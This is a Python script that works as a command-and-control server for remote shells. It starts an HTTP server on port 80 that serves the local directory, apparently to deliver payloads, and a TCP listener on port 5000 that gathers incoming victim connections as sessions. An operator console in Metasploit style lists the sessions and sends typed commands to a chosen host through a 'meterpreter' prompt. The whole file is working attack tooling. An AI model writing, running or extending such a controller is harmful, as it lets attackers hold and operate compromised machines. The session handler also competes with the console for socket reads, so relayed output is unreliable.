import http.server
import socketserver
import threading
import socket
import os

HTTP_PORT = 80
TCP_PORT = 5000
sessions = {}
session_id = 0
shutdown_flag = threading.Event()

class ThreadedTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global session_id
        session_id += 1
        sid = session_id
        sessions[sid] = self.request
        print(f"[+] New session: {sid} from {self.client_address}")
        try:
            while not shutdown_flag.is_set():
                data = self.request.recv(1)
                if not data:
                    break
        except:
            pass
        finally:
            print(f"[-] Session {sid} closed")
            del sessions[sid]

class TCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

def run_http_server():
    os.chdir(".")
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        httpd.timeout = 1  # short timeout so we can check for shutdown
        print(f"[+] HTTP server running on port {HTTP_PORT}")
        while not shutdown_flag.is_set():
            httpd.handle_request()

def run_tcp_server():
    with TCPServer(("", TCP_PORT), ThreadedTCPHandler) as tcpd:
        tcpd.timeout = 1  # allow checking the shutdown flag
        print(f"[+] TCP server running on port {TCP_PORT}")
        while not shutdown_flag.is_set():
            try:
                tcpd.handle_request()
            except socket.timeout:
                continue

def shell():
    while not shutdown_flag.is_set():
        try:
            cmd = input("main > ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Exiting...")
            shutdown_flag.set()
            break

        if cmd == "sessions -l":
            for sid in sessions:
                print(f"Session {sid}: connected")
        elif cmd.startswith("sessions -i"):
            try:
                _, _, sid = cmd.split()
                sid = int(sid)
                if sid not in sessions:
                    print("Invalid session")
                    continue
                interact(sid)
            except Exception as e:
                print("Usage: sessions -i <id>"); print("Exception: ", e)
        elif cmd == "exit":
            shutdown_flag.set()
            break

def interact(sid):
    s = sessions.get(sid)
    if not s:
        print("Session closed.")
        return

    print(f"[*] Interacting with session {sid}")
    while not shutdown_flag.is_set():
        try:
            cmd = input(f"meterpreter ({sid}) > ").strip()
        except KeyboardInterrupt:
            print("\n[*] Returning to main shell.")
            break

        if not cmd:
            continue
        if cmd == "background":
            break
        try:
            s.sendall(cmd.encode())
            data = s.recv(8192)
            try:
                print(data.decode('utf-8').strip())
            except UnicodeDecodeError:
                print(data)
        except Exception as e:
            print(f"[!] Error with session {sid}: {e}")
            break

def main():
    t1 = threading.Thread(target=run_http_server)
    t2 = threading.Thread(target=run_tcp_server)
    t1.start()
    t2.start()

    try:
        shell()
    finally:
        shutdown_flag.set()
        t1.join()
        t2.join()
        print("[*] Shutdown complete.")

if __name__ == "__main__":
    main()
